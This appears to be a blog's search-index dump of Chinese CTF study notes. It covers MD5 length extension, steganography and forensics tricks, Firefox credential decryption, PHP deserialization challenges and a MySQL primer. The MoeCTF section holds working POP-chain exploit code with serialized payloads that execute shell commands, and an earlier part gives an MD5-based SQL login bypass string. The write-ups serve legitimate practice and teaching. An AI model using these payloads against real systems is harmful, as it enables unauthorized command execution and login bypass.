00即代表0x03f0，其对应的十进制为1008，即为64+62&#x3D;126个字符的二进制位数(一个字符1Byte即8bit)。\n加密流程\n对于MD5算法来说，有一串初始向量如下：\nA=0x67452301B=0xefcdab89C=0x98badcfeD=0x10325476\n\n这串初始向量的值是固定的，作为与第一块数据运算的原始向量。\n当这串向量与第一块数据块运算之后，得到了一串新的向量值，这串新的向量值接着与第二块数据块参加运算，直到最后一块数据块。\n具体怎么运算的我们不需要知道\n如下图所示：\n而最后的MD5值就是这最后的向量串经过如下转换的结果。\n那我们如何把向量串转化为字符串呢\n//如向量串：A=0xab45bc01B=0x6a64bb53C=0x23ba8afeD=0x46847a62//先两两为一组进行组合，得到如下数据：ab 45 bc 016a 64 bb 5323 ba 8a fe46 84 7a 62//再进行高低位互换，得到如下数据：01 bc 45 ab53 bb 64 6afe 8a ba 2362 7a 84 46\n\n最终拼接得到MD5值：01bc45ab53bb646afe8aba23627a8446。\n因此通过我们的MD5值可以推出最后的向量串\n对于MD5值：2df51a84abc64a28740d6d2ae8cd7b16。我们可以根据MD5与向量互转规则，将MD5转成md5($secretKey + &quot;test&quot;)的最终向量值（A’、B’、C’、D’）：\nA&#x27;=0x841af52dB&#x27;=0x284ac6abC&#x27;=0x2a6d0d74D&#x27;=0x167bcde8\n\n过程如图：\n这时候我们修改$v1变量的内容为：\n&quot;test&quot; + [0x80 + (0x0)*45] + [0x50 + 0x0*7] + &quot;abc&quot;相当于:&quot;test&quot; + padding数据 + 长度数据 + &quot;abc&quot;\n\n则上述过程则被延续成下图所示：\n\n\n而对于上述运算过程来说，我们知道了倒数第二个向量串的内容和最后一个数据块，这样一来，最终的MD5值我们也可以自己通过MD5算法计算出来了。\n原理就是，我们自己添加本来应该要MD5()添加的padding，和长度数据，使得第一次加密相当于最后一次加密，我们可以通过返回的md5值推出经过运算的向量串\n第二次我们又在后面加上’abc’等特殊字符串，由于前面已经添加了padding和长度数据，’abc’单独作为一个数据块进行运算，需要注意的是长度数据需要加上前一个数据块。在我们知道最后一次数据块和\n5.MD5特殊字符串1.加密后等于自身之前我们都是控制两个字符串然后加密后通过各种比较，但是还没有尝试过一个字符串经过面对MD5加密弱比较等于自己\n&lt;?phpecho md5(&#x27;0e215962017&#x27;);//0e291242476940776845150308577824\n\n0e215962017经过加密后弱比较等于原字符串\n2.加密后变为万能密码这个感觉就是用在那些直接将字符串经过MD5加密后就直接储存在数据库中，再次查询时直接通过万能密码绕过\nffifdyop\n\nMD5函数返回的是16进制，在执行sql语句的时候16进制会被解析然后万能密码绕过\n\n"},{"title":"Misc笔记","url":"/2025/05/23/Misc%E7%AC%94%E8%AE%B0/","content":"Misc做题笔记前言虽然杂项说是不需要特别的去写题解，但是如果遇到某种特别的隐写方法和思路想不起来就麻烦了，于是只能看着去写题目了，遇到什么写什么\n1.logo语言第一次遇到来自于**[RCTF2019]draw**，数据如下\ncs pu lt 90 fd 500 rt 90 pd fd 100 rt 90 repeat 18[fd 5 rt 10] lt 135 fd 50 lt 135 pu bk 100 pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd 5 rt 10] rt 90 fd 60 rt 90 bk 30 rt 90 fd 60 pu lt 90 fd 100 pd rt 90 fd 50 bk 50 setcolor pick [ red orange yellow green blue violet ] lt 90 fd 50 rt 90 fd 50 pu fd 50 pd fd 25 bk 50 fd 25 rt 90 fd 50 pu setcolor pick [ red orange yellow green blue violet ] fd 100 rt 90 fd 30 rt 45 pd fd 50 bk 50 rt 90 fd 50 bk 100 fd 50 rt 45 pu fd 50 lt 90 pd fd 50 bk 50 rt 90 setcolor pick [ red orange yellow green blue violet ] fd 50 pu lt 90 fd 100 pd fd 50 rt 90 fd 25 bk 25 lt 90 bk 25 rt 90 fd 25 setcolor pick [ red orange yellow green blue violet ] pu fd 25 lt 90 bk 30 pd rt 90 fd 25 pu fd 25 lt 90 pd fd 50 bk 25 rt 90 fd 25 lt 90 fd 25 bk 50 pu bk 100 lt 90 setcolor pick [ red orange yellow green blue violet ] fd 100 pd rt 90 arc 360 20 pu rt 90 fd 50 pd arc 360 15 pu fd 15 setcolor pick [ red orange yellow green blue violet ] lt 90 pd bk 50 lt 90 fd 25 pu home bk 100 lt 90 fd 100 pd arc 360 20 pu home\n\n我们可以看到这个主要特征就是前面为类似坐标的编码，中括号里面则是颜色，我们直接上网站\nlogo语言解释网站\n编译网站\n\n\n直接在代码区域输入就可以看到flag了\n2.TTL隐写来自**[SWPU2019]Network**，我们先直接看数据，真的太长了，就直接放一部分\n\n\n发现全是63、255、127、191这四个数字组成，发现这些数字正好符合Ip的组成。\n于是以后发现一堆数字由相同的四个符合IP的数字组成优先考虑TTL隐写\n简单来说就是，图中63，127，191，255转化为二进制的值分别为 00111111，01111111，10111111，11111111。\n发现只有前两位不同，TTL加密就是利用前两位进行加密，将每个前两位重新进行合并，8位为一组。\n所以TTL加密的解密方法：\n1，将所有前两位合并为8位，并且每八位一组。\n2，将上面的每组转化为十六进制的字符\nTTL脚本，需要将脚本中四个数字进行修改\nimport binascii f = open(&#x27;[SWPU 2019]Network.txt&#x27;, &quot;r&quot;)str = &#x27;&#x27;Binary = &#x27;&#x27;number = &#x27;&#x27;while 1:    num = f.readline()    if not num:        break    if num.rstrip() == &#x27;63&#x27;:  # 去掉每行后面的空格        Binary = &#x27;00&#x27;    elif num.rstrip() == &#x27;127&#x27;:        Binary = &#x27;01&#x27;    elif num.rstrip() == &#x27;191&#x27;:        Binary = &#x27;10&#x27;    elif num.rstrip() == &#x27;255&#x27;:        Binary = &#x27;11&#x27;    str += Binaryfor i in range(0, len(str), 8):    number += chr(int(str[i:i + 8], 2))data = binascii.unhexlify(number) f2=open(&#x27;1.txt&#x27;,&#x27;wb&#x27;)f2.write(data)f2.close()\n\n脚本跑完后发现是一个zip文件，我们改完后缀后发现存在加密，但是题解说没有，自己尝试去解决伪加密发现失败于是用脚本\n后面就是base64多层加密，只能老实的去手动解密了\n多次base64解密\nf = open(&#x27;./base64.txt&#x27;).read()import base64while 1:    try:        f = base64.b32decode(f)        print(f.decode()[:100])    except:        try:            f = base64.b64decode(f)            print(f.decode()[:100])        except:            print(f[:100])            break\n\n\n\n\n\n\n\n3.可执行文件在写题目**[UTCTF2020]File Carving**的时候一张图片经过binwalk分离出来后是一个未知的文件\n看了题解后发现是一个可执行文件，我们有两个方法。一是直接在010editor中去找flag\n\n\n将这里面的那些奇怪字符删掉就成了flag\n第二就是正解了，直接丢到kali中去运行，记得先右键设置属性为可执行文件\n\n\n直接在命令行中运行\n\n\n\n\n\n\n4.汉信码来源于题目**[GKCTF 2021]excel 骚操作**，我们拿到的是一个xlsx文件，我们点击单元格发现\n\n\n有些框的函数为1，有些为0。我们全选然后让其显现\n\n\n这样改成功显现\n我们将1替换为黑色块，然后改宽度拿到\n\n\n这个码属于汉信码，我们用中国编码这个软件去扫拿到\nflag&#123;9ee0cb62-f443-4a72-e9a3-43c0b910757e&#125;\n\n5.文件拼接和脚本解码来自题目**[MRCTF2020]pyFlag**，下载附件拿到三张图片和一个.DS_store文件，这题还不知道.DS文件的作用\n使用010editor打开三张图片，定位图片尾发现提示\n\n\n三张图片后面跟着一个压缩包的三部分，我们拼接成一个压缩包。发现有密码爆破拿到密码1234于是解压拿到两个txt文件\nhint.txt我用各种baseXX编码把flag套娃加密了，你应该也有看出来。但我只用了一些常用的base编码哦，毕竟我的智力水平你也知道...像什么base36base58听都没听过提示：0x10,0x20,0x30,0x55\n\n\n\nflag.txtG&amp;eOhGcq(ZG(t2*H8M3dG&amp;wXiGcq(ZG&amp;wXyG(j~tG&amp;eOdGcq+aG(t5oG(j~qG&amp;eIeGcq+aG)6Q&lt;G(j~rG&amp;eOdH9&lt;5qG&amp;eLvG(j~sG&amp;nRdH9&lt;8rG%++qG%__eG&amp;eIeGc+|cG(t5oG(j~sG&amp;eOlH9&lt;8rH8C_qH9&lt;8oG&amp;eOhGc+_bG&amp;eLvH9&lt;8sG&amp;eLgGcz?cG&amp;3|sH8M3cG&amp;eOtG%_?aG(t5oG(j~tG&amp;wXxGcq+aH8V6sH9&lt;8rG&amp;eOhH9&lt;5qG(&lt;E-H8M3eG&amp;wXiGcq(ZG)6Q&lt;G(j~tG&amp;eOtG%+&lt;aG&amp;wagG%__cG&amp;eIeGcq+aG&amp;M9uH8V6cG&amp;eOlH9&lt;8rG(&lt;HrG(j~qG&amp;eLcH9&lt;8sG&amp;wUwGek2)\n\n虽然提示说用base解码，但是这个着实看不懂，也不知道怎么解，最后是用了大佬写的脚本，看起来就是这个编码是一个各种Base编码混合的，于是就使用正则匹配字符然后进行解码\n#!/usr/bin/env pythonimport base64import redef baseDec(text,type):    if type == 1:        return base64.b16decode(text)    elif type == 2:        return base64.b32decode(text)    elif type == 3:        return base64.b64decode(text)    elif type == 4:        return base64.b85decode(text)    else:        passdef detect(text):    try:        if re.match(&quot;^[0-9A-F=]+$&quot;,text.decode()) is not None:            return 1    except:        pass        try:        if re.match(&quot;^[A-Z2-7=]+$&quot;,text.decode()) is not None:            return 2    except:        pass    try:        if re.match(&quot;^[A-Za-z0-9+/=]+$&quot;,text.decode()) is not None:            return 3    except:        pass        return 4def autoDec(text):    while True:        if b&quot;MRCTF&#123;&quot; in text:            print(&quot;\\n&quot;+text.decode())            break        code = detect(text)        text = baseDec(text,code)with open(&quot;flag.txt&quot;,&#x27;rb&#x27;) as f:    flag = f.read()autoDec(flag)\n\n\n\n6.wav文件频谱图当我们遇到一个wav文件没有什么隐藏信息的时候，可以使用audacity查看频谱图\n鼠标在左侧右键打开频谱图即可\n\n\n\n\n\n\n7.时间轴隐写我们在遇到gif图片中找不到隐藏信息的时候，可以尝试时间轴隐写\nGIF 文件每一帧间的时间间隔也可以作为信息隐藏的载体，隐藏具体方式需具体分析，可以通过 identify 命令清晰的打印出每一帧的时间间隔。\nidentify -format &quot;%s %T \\n&quot; 100.gif     #格式：帧序号 间隔  %s用于输出帧数 %T用于输出间隔时间\n\n例题来源:buuctf-蜘蛛侠呀\n这个题目比较难，先是流量分析，用脚本把数据拼到一起后还要进行一系列处理，这里来一个ICMP的脚本\nimport pysharkimport binascii# 打开PCAP文件并设置过滤器packets = pyshark.FileCapture(&#x27;out.pcap&#x27;, tshark_path=&#x27;D:\\softs\\Misctools\\wireshark\\\\tshark.exe&#x27;)res = []# 处理每个数据包for each in packets:    try:        # 解码ICMP数据负载        data = binascii.unhexlify(each.icmp.data).decode()                # 去除头部的 $$START$$        if data.startswith(&#x27;$$START$$&#x27;):            data = data[len(&#x27;$$START$$&#x27;):]                # 去除重复项        if data not in res:            res.append(data)    except Exception as e:        print(f&quot;Error processing packet: &#123;e&#125;&quot;)# 将结果写入文件with open(&#x27;out.txt&#x27;, &#x27;w&#x27;) as f:    f.write(&#x27;&#x27;.join(res))# 关闭数据包读取器packets.close()print(&#x27;done&#x27;)\n\n然后将得到的Base64数据解压保存为压缩包然后解压得到gif图片\n使用命令\nidentify -format &quot;%T&quot; flag.gif\n\n拿到\n2050502050502050205020202050202020205050205020502050205050505050202050502020205020505050205020206666\n\n这个我不知道哪个鬼才想到的，把666给删除了然后再将50转为1，20转为0得到\n011011010100010000110101010111110011000101110100\n\n然后使用二进制解码得到\nmD5_1t\n\n进行MD5编码拿到flag\nflag&#123;f0f1003afe4ae8ce4aa8e8487a8ab3b6&#125;\n\n\n\n\n\n8.AES加密没学过密码，遇到加密的密文时密钥都送到手上了，结果不知道是哪种加密\naes加密特别多，根本不会，而且很多网站加解密都不是那么好用，到最后还是厨师长方便一点\nAES密文需要密钥和偏移量两个数据，也就是\nkey: Th1s_1s_K3y00000iv: 1234567890123456\n\n\n\n然后就是在厨师长中解密的话输入只有Hex和Raw两个模式，所以我们遇到密文需要先进行解密然后再转Hex，最后进行AES解密\n\n\n然后经过我测试，不需要偏移量的加密方式，加和不加都不会影响解密\n9.gcode遇到这种代码\nM73 P0 R2M201 X9000 Y9000 Z500 E10000M203 X500 Y500 Z12 E120M204 P2000 R1500 T2000M205 X10.00 Y10.00 Z0.20 E2.50M205 S0 T0M107M115 U3.1.0M83M204 S2000 T1500M104 S215M140 S60M190 S60M109 S215G28 WG80G1 Y-3.0 F1000.0G92 E0.0G1 X60.0 E9.0  F1000.0M73 P4 R1G1 X100.0 E12.5  F1000.0G92 E0.0M900 K30G21G90M83G92 E0.0G1 E-0.80000 F2100.00000G1 Z0.600 F10800.000G1 X89.987 Y95.416G1 Z0.200G1 E0.80000 F2100.00000M204 S1000G1 F1200G1 X90.219 Y94.784 E0.02112G1 X90.632 Y94.252 E0.02112G1 X91.187 Y93.871 E0.02112G1 X91.836 Y93.677 E0.02123G1 X157.871 Y93.656 E2.07047G1 X158.694 Y93.819 E0.02631G1 X159.395 Y94.279 E0.02631G1 X159.872 Y94.969 E0.02631G1 X160.055 Y95.788 E0.02631\n\n问了一下DS，这是gecode语言，直接使用在线网站解即可gcode网站\n\n\n然后把旁边这些多余的给去掉即可看见flag\n10.Firepwd题目来源[GKCTF 2021]FireFox Forensics\n题目提示这是一份登录凭证文件\n然后下载下来是没见过的文件\n\n\n说是内存取证，可是以前也没见过，打开json文件，发现储存着账号和密码，虽然是Base64编码，但是解出来的却是乱码，看了题解说这个被加密了，我们不能直接解密\n&#123;&quot;nextId&quot;:5,&quot;logins&quot;:[&#123;&quot;id&quot;:1,&quot;hostname&quot;:&quot;https://ctf.g1nkg0.com&quot;,&quot;httpRealm&quot;:null,&quot;formSubmitURL&quot;:&quot;https://ctf.g1nkg0.com&quot;,&quot;usernameField&quot;:&quot;user&quot;,&quot;passwordField&quot;:&quot;pw&quot;,&quot;encryptedUsername&quot;:&quot;MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECBXzxJ6wNr0cBAhx14543pGy8g==&quot;,&quot;encryptedPassword&quot;:&quot;MFoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECMW2u+IHw6/EBDANYRi1rCmbtlQ+NcZ8LX3T5PpXCaOdhDA5WIfxNe6r5MInejMWjj2dBFnNCG2eTSA=&quot;,&quot;guid&quot;:&quot;&#123;f2f8705f-9210-42f6-b74a-de8f7d48d90a&#125;&quot;,&quot;encType&quot;:1,&quot;timeCreated&quot;:1620471029427,&quot;timeLastUsed&quot;:1620471029427,&quot;timePasswordChanged&quot;:1620471029427,&quot;timesUsed&quot;:1&#125;],&quot;disabledHosts&quot;:[],&quot;version&quot;:3,&quot;potentiallyVulnerablePasswords&quot;:[],&quot;dismissedBreachAlertsByLoginGUID&quot;:&#123;&#125;&#125;\n\n然后就是db文件了，打开发现也是乱码\n然后根据题目名称FireFox Forensics可以判断这是火狐的账号密码\n于是使用Firepwd进行解密，我们将key4.db和logins.json复制到Firepwd目录下，然后执行\npython firepwd.py\n\n发现其破解了账号和密码，密码就是flag\n\n\nflag\nGKCTF&#123;9cf21dda-34be-4f6c-a629-9c4647981ad7&#125;\n\n\n\n11.QSSTV这个就是一个音频隐写，我也不知道是什么原理\n题目来源[MRCTF2020]摇滚DJ（建议大声播放\n我们下载得到一个wan文件，但是使用audacity打开发现什么都没有\n\n\n看了题解使用的是QSSTV隐写\n直接打开kali自带的QSSTV，然后直接加载文件就可以拿到一张带有flag的图片\n\n\nflag\nmerak&#123;r3ce1ved_4n_img&#125;\n\n\n\n12.文件恢复和镜像挂载题目来源[XMAN2018排位赛]file\n我们下载下来是一个img后缀文件，属于光盘镜像文件，打开发现文件损坏，我们尝试使用foremost提取文件发现得到一堆图片，但是没有flag\n看了题解之后才知道foremost不能提取被删除的文件，这里的删除不是完全不见了，更类似于被文件系统删除了然后放入回收站了，文件数据仍然在但是文件系统中已经无法访问了\n我们先尝试对其进行挂载\nsudo mount /home/kali/Desktop/attachment.img /mnt\n\n然后我们打开文件夹发现和之前提取出来的图片一样\n\n\n不知道为什么大佬们说ls命令发现lost+found文件就意味着有文件被删除，但是下次遇到记得尝试一下就行了\n我们使用文件恢复工具extundelete先查看文件\nsudo extundelete attachment.img --inode 2\n\n发现有一个隐藏图片被删除了\n\n\n然后尝试恢复Inode为18的文件\n# 恢复inode为18的文件：sudo extundelete attachment.img --restore-inode 18# 恢复文件名为.cat.jpg的文件：sudo extundelete attachment.img --restore-file .cat.jpg\n\n得到文件file.18，打开直接获得flag\n\n\n然后我们也可以直接将整个镜像文件进行恢复\nextundelete attachment.img --restore-all\n\n只不过恢复的文件会有点乱\n13.F5隐写题目来源buuctf刷新过的图片\n拿到一张图片什么都没有发现，然后题目提示我们’浏览图片的时候刷新键有没有用呢’\n然后发现图片和刷新根本就没有关系，题解说键盘上的刷新键是F5键，所以是F5隐写，有点脑洞，而且我连F5隐写也不知道\nF5-steganography隐写工具\n这个需要在Linux系统下运行，先下载\ngit clone https://github.com/matthewgao/F5-steganography\n\n然后这个工具需要JDK11，kali自带的版本肯定是高了的，我们需要换JDK版本\n然后进行隐写会得到一个output.txt文件\njava Extract /home/kali/Desktop/Misc.jpg\n\n我们打开发现是一个压缩包，改后缀为zip然后伪加密即可拿到flag\n14.文字盲水印这个也是考的偏的没边了，之前那个图片盲水印好歹可以判断一下（题目会给你两张看起来一样的图片去提取盲水印） ，这个就是看起来像是零宽字节隐写，但是实际上要先进行文字盲水印解密\n如果要说有什么特征的话就是字符数目会特别多，有一万多\n题目来源ISCTF2025 星髓宝盒\n我们直接跳到密文那里\n\n\n看起来是和零宽字符隐写一样\n文字盲水印解密网站https://www.guofei.site/pictures_for_blog&#x2F;app&#x2F;text_watermark&#x2F;v1.html\n我们拿到的密文是零宽字符隐写\n\n\n然后这个工具也是开源的项目地址https://github.com/guofei9987/text_blind_watermark\n15.whitespace隐写题目地址[NewStarCTF 2023 公开赛道]空白格\n题目就给了一个文本文件，看见题目是空白格还以为是snow隐写，然后发现既没有密匙，数据也不对，snow隐写的数据没有这么整齐，这个更像是某种编码\n\n\n看了题解发现这是whitespace语言，看了一下发现就是拿空白字符写的汇编语言，然后这个代码需要我们运行whitespace代码就会输出flag\n运行网站whitespace在线运行,在线工具，在线编译IDE_w3cschool\n\n\n拿到flag\nflag&#123;w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04&#125;\n\n\n\n\n\n\n\n\n\n"},{"title":"MoeCTF","url":"/2025/09/13/MoeCTF/","content":"MoeCTF这是西电出的一个新生赛，比赛性没多少给新生做一下还是可以的。虽然这些题目对我难度不是特别大，但是还是在一些细节的地方卡住过，还是基础有点差，所以还是把一些不熟悉的知识写一下\n1.js代码包含cookie这个虽然很基础，但是我就是当时不知道，问了下ai才知道我在浏览器控制台执行js代码没带cookie导致回显验证\n题目是一个小游戏，但是flag和游戏没有关系，我看到一个代码\nif(userGuess === randomNumber) &#123;  lastResult.textContent = &#x27;恭喜你！猜对了！&#x27;;  lastResult.style.backgroundColor = &#x27;green&#x27;;  lowOrHi.textContent = &#x27;&#x27;;  guessField.disabled = true;  guessBtn.disabled = true;  // 猜对后请求flag  fetch(&#x27;/flag&#x27;, &#123;method: &#x27;POST&#x27;&#125;)    .then(res =&gt; res.json())    .then(data =&gt; &#123;      document.querySelector(&#x27;.flagResult&#x27;).textContent = &quot;FLAG: &quot; + data.flag;    &#125;);  setGameOver();&#125;\n\n我是直接拿着哪个fetch语句去控制台执行，没有cookie后台不会回显\n正确做法为\n// 在浏览器控制台执行fetch(&#x27;/flag&#x27;, &#123;  method: &#x27;POST&#x27;,  credentials: &#x27;include&#x27;  // 包含cookie&#125;).then(response =&gt; response.json()).then(data =&gt; console.log(data.flag))//输出flag.catch(error =&gt; console.error(&#x27;Error:&#x27;, error));\n\n\n\n\n\n2.php反序列化这就是网安强校吗，军训都没训完，C语言都没教就写反序列化，然后19章之后还有点难，老实了，再也不敢打CTF了\n前面几个反序列化题目都比较容易，就十九章的两个题目需要写一下\n1.星穹真相·补天归源&lt;?phphighlight_file(__FILE__);class Person&#123;    public $name;    public $id;    public $age;    public function __invoke($id)    &#123;        $name = $this-&gt;id;        $name-&gt;name = $id;        $name-&gt;age = $this-&gt;name;    &#125;&#125;class PersonA extends Person&#123;    public function __destruct()    &#123;        $name = $this-&gt;name;        $id = $this-&gt;id;        $age = $this-&gt;age;        $name-&gt;$id($age);    &#125;&#125;class PersonB extends Person&#123;    public function __set($key, $value)    &#123;        $this-&gt;name = $value;    &#125;&#125;class PersonC extends Person&#123;    public function __Check($age)    &#123;        if(str_contains($this-&gt;age . $this-&gt;name,&quot;flag&quot;))        &#123;            die(&quot;Hacker!&quot;);        &#125;        $name = $this-&gt;name;        $name($age);    &#125;    public function __wakeup()    &#123;        $age = $this-&gt;age;        $name = $this-&gt;id;        $name-&gt;age = $age;        $name($this);    &#125;&#125;if(isset($_GET[&#x27;person&#x27;]))&#123;    $person = unserialize($_GET[&#x27;person&#x27;]);&#125;\n\n这个代码一开始我看到的是有点懵的，代码中出现了好多次$name($this);可以控制参数进行函数执行的地方，而且根据代码可以看出这是php8，php8是会检查序列化数据是否合法的，也就是无法绕过__wakeup，但同时又出现了__destruct，这让我不知道该从哪里开始。\n一开始我想直接通过__wakeup直接system，但是我发现一个致命的地方就是出现了两处这样的代码\npublic function __wakeup()&#123;            $age = $this-&gt;age;    $name = $this-&gt;id;//默认获取的是字符串    $name-&gt;age = $age;//然后又对字符串这里进行对象才能使用的语法，肯定是会报错的    $name($this);//为了不报错只能指向对象然后触发involke 参数也是对象，看来pop链跑不了了&#125;\n\n就是报错，这些报错会导致我无法这么简单的进行函数执行\npublic function __invoke($id)&#123;    $name = $this-&gt;id;//这里也是不得不指向对象，不然报错    $name-&gt;name = $id;    $name-&gt;age = $this-&gt;name;&#125;\n\n但是我发现这个pop链好像不能连下去了，莫非这个存在的意义就是让wakeup那里不报错吗\n于是我们只能再来看destruct\npublic function __destruct()&#123;    $name = $this-&gt;name;//也是必须传对象    $id = $this-&gt;id;    $age = $this-&gt;age;    $name-&gt;$id($age);//这里不是简单的$name($age)，是通过对象获取的，也就是id必须是对象中存在的方法&#125;\n\n我们来看一下为什么必须调用__Check方法来进行命令执行\npublic function __Check($age)&#123;    if(str_contains($this-&gt;age . $this-&gt;name,&quot;flag&quot;))    &#123;        die(&quot;Hacker!&quot;);    &#125;    $name = $this-&gt;name;    $name($age);//这里name终于可以是字符串，age我们也可以控制，终点到了&#125;\n\n\n\n于是我们的思路有了，就是在php8中无法绕过wakeup，我们就需要让其不触发报错，然后再通过destruct去触发__Check方法实现函数执行\n&lt;?phpclass Person&#123;    public $name;    public $id;    public $age;    public function __invoke($id)//2.$id为$pc 参数属于局部变量不会影响$this-&gt;id    &#123;        $name = $this-&gt;id;        $name-&gt;name = $id;        $name-&gt;age = $this-&gt;name;//这里进行了赋值但不知道有什么用，但是$p-&gt;id必须为对象，如果这里选择pa，我们执行命令的时候参数age会被覆盖，我们需要将p-&gt;name=&#x27;cat /*&#x27;    &#125;&#125;class PersonA extends Person&#123;    public function __destruct()//3.执行完invoke来执行destruct    &#123;        $name = $this-&gt;name;//wakeup链没有涉及pa  我们可以通过反序列化pc赋值给this-&gt;name触发Check方法，我们也可以利用invoke方法中p-&gt;id为pa直接将pc赋值给name        $id = $this-&gt;id;        $age = $this-&gt;age;//控制参数        $name-&gt;$id($age);//触发Check方法    &#125;&#125;class PersonB extends Person&#123;    public function __set($key, $value)    &#123;        $this-&gt;name = $value;    &#125;&#125;class PersonC extends Person&#123;    public function __Check($age)//4.    &#123;        if(str_contains($this-&gt;age . $this-&gt;name,&quot;flag&quot;))        &#123;            die(&quot;Hacker!&quot;);//过滤了flag        &#125;        $name = $this-&gt;name;//直接system        $name($age);//命令执行    &#125;    public function __wakeup()    &#123;        $age = $this-&gt;age;        $name = $this-&gt;id;//1.赋值p用于触发involke        $name-&gt;age = $age;//注意这里p的age参数被赋值 p作为父类被赋值会影响其他类的属性，但是这题后面pa-&gt;age又会被覆盖，这里没用        $name($this);//触发invoke，以pc为参数    &#125;&#125;$p=new Person();$pa=new PersonA();$pb=new PersonB();$pc=new PersonC();$pa-&gt;name=$pc;//这里也是为了在本地不报错，触发wakeup会自动赋值$p-&gt;name=&#x27;cat /*&#x27;;$pa-&gt;id=&#x27;__Check&#x27;;$pc-&gt;name=&#x27;system&#x27;;$pa-&gt;age=&#x27;ls&#x27;;$p-&gt;id=$pa;$pc-&gt;id=$p;echo serialize($pc);//实际上执行的是cat /*命令//O:7:&quot;PersonC&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;system&quot;;s:2:&quot;id&quot;;O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;cat /*&quot;;s:2:&quot;id&quot;;O:7:&quot;PersonA&quot;:3:&#123;s:4:&quot;name&quot;;r:1;s:2:&quot;id&quot;;s:7:&quot;__Check&quot;;s:3:&quot;age&quot;;s:2:&quot;ls&quot;;&#125;s:3:&quot;age&quot;;N;&#125;s:3:&quot;age&quot;;N;&#125;\n\n这里我一开始犯了一个错误，就是我在本地是直接构造好自己可以使用的pop链就直接serilaize，但是这样是不会触发wakeup的，也就是再invoke方法那里对pa-&gt;age参数的覆盖我是没有计算到内的，所以为了在本地运行不报错，我就还是给age赋值了一个ls命令，但是实际上在靶场中执行的是cat /*\n这题目我怎么感觉出的这么抽象呢，好绕啊，还使用了父类和子类，还有pb是不是根本就没有用到\n没想到一个新生赛的反序列化花了我快一个小时，快菜死了\n2.revenge又来了，又是一个阴间反序列化题目\n&lt;?php//highlight_file(__FILE__);class Person&#123;    public $name;    public $id;    public $age;&#125;class PersonA extends Person&#123;    public function __destruct()    &#123;        $name = $this-&gt;name;        $id = $this-&gt;id;        $name-&gt;$id($this-&gt;age);        //var_dump($this-&gt;age);    &#125;&#125;class PersonB extends Person&#123;    public function __set($key, $value)    &#123;        $this-&gt;name = $value;    &#125;    public function __invoke($id)    &#123;        $name = $this-&gt;id;        $name-&gt;name = $id;        //var_dump($name);        $name-&gt;age = $this-&gt;name;    &#125;&#125;class PersonC extends Person&#123;    public function check($age)    &#123;        $name=$this-&gt;name;        if($age == null)        &#123;            die(&quot;Age can&#x27;t be empty.&quot;);        &#125;        else if($name === &quot;system&quot;)        &#123;            die(&quot;Hacker!&quot;);        &#125;        else        &#123;            var_dump($name($age));        &#125;    &#125;    public function __wakeup()    &#123;        $name = $this-&gt;id;        $name-&gt;age = $this-&gt;age;        $name($this);    &#125;&#125;$pc = new PersonC();$pa = new PersonA();$p = new Person();$pb = new PersonB();$pc-&gt;name=&#x27;passthru&#x27;;$pa-&gt;name=$pc;$pa-&gt;age=&#x27;ls&#x27;;$pa-&gt;id=&#x27;check&#x27;;$pb-&gt;name=&#x27;env&#x27;;$pb-&gt;id=$pa;$pc-&gt;id=$pb;echo serialize($pc);//O:7:&quot;PersonC&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;passthru&quot;;s:2:&quot;id&quot;;O:7:&quot;PersonB&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;env&quot;;s:2:&quot;id&quot;;O:7:&quot;PersonA&quot;:3:&#123;s:4:&quot;name&quot;;r:1;s:2:&quot;id&quot;;s:5:&quot;check&quot;;s:3:&quot;age&quot;;s:2:&quot;ls&quot;;&#125;s:3:&quot;age&quot;;N;&#125;s:3:&quot;age&quot;;N;&#125;\n\n思路和上一个题目差不多，只不过flag放到了env里面，然后就是system被过滤了\n"},{"title":"MySQL","url":"/2025/01/03/MySQL/","content":"MySQL笔记1.MySQL简介数据库（Database）是按照数据结构来组织、存储和管理数据的仓库。\n每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据。\n我们也可以将数据存储在文件中，但是在文件中读写数据速度相对较慢。\n所以，现在我们使用关系型数据库管理系统（RDBMS）来存储和管理大数据量。所谓的关系型数据库，是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。\nRDBMS 即关系数据库管理系统(Relational Database Management System)的特点：\n\n1.数据以表格的形式出现\n2.每行为各种记录名称\n3.每列为记录名称所对应的数据域\n4.许多的行和列组成一张表单\n5.若干的表单组成database\n\nMySQL 是最流行的关系型数据库管理系统，在 WEB 应用方面 MySQL 是最好的 RDBMS(Relational Database Management System：关系数据库管理系统)应用软件之一。\n2.MySQL基本操作在SQL语句中，不区分大小写，但建议关键词大写\n1.连接数据库您可以使用 MySQL 二进制方式进入到 mysql 命令提示符下来连接 MySQL 数据库，格式如下：\nmysql -u your_username -p\n\n参数说明：\n\n-u 参数用于指定用户名。\n-p 参数表示需要输入密码。\n\n默认username与password为root；\n实例：\nmysql -u root -p\n\n在登录成功后会出现 mysql&gt; 命令提示窗口，你可以在上面执行任何 SQL 语句。\n以上命令执行后，登录成功输出结果如下:\nWelcome to the MySQL monitor.  Commands end with ; or \\g.Your MySQL connection id is 2854760 to server version: 5.0.9Type &#x27;help;&#x27; or &#x27;\\h&#x27; for help. Type &#x27;\\c&#x27; to clear the buffer.\n\n\n\n2.创建数据库我们可以在登陆 MySQL 服务后，使用 create 命令创建数据库，语法如下:\nCREATE DATABASE 数据库名;\n\n实例：\nCREATE DATABASE test;\n\n我们可以查看数据库：\nSHOW DATABABES;\n\n\n\n3.删除数据库使用普通用户登陆 MySQL 服务器，你可能需要特定的权限来创建或者删除 MySQL 数据库，所以我们这边使用 root 用户登录，root 用户拥有最高权限。\n在删除数据库过程中，务必要十分谨慎，因为在执行删除命令后，所有数据将会消失。\ndrop命令删除数据库drop命令格式：\nDROP DATABASE &lt;database_name&gt;;        -- 直接删除数据库，不检查是否存在或DROP DATABASE [IF EXISTS] &lt;database_name&gt;;\n\n实例：\nDROP DATABASE [IF EXISTS] test1;\n\n\n\n\n\n4.选择数据库在 mysql&gt; 提示窗口中可以很简单的选择特定的数据库。\n在 MySQL 中，要选择要使用的数据库，可以使用 USE 